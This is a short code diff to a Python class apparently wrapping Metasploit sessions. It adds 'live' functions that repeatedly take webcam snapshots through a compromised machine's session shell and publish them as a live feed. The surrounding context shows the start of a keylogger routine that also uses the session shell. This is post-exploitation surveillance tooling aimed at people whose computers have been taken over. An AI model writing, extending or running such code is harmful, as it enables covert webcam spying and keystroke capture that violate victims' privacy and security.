@@ -157,6 +157,26 @@ class MsfToolbox:
 	def get_snapshots_url(self, session):
 		return media.get_medias_url(session, "snapshots")
 
+
+	# Live
+	def start_live(self, session):
+		return
+
+
+	def stop_live(self, session):
+		media.remove_live_path()
+
+
+	def live_update_frame(self, session):
+		shell = self.get_session_shell(session)
+		live_path = media.get_live_path()
+		webcam.post_take_snapshot(shell, live_path)
+
+
+	def get_live_url(self):
+		return media.get_live_url()
+
+
 	# Keylogger
 	def start_keylogger(self, session):
 		shell = self.get_session_shell(session)
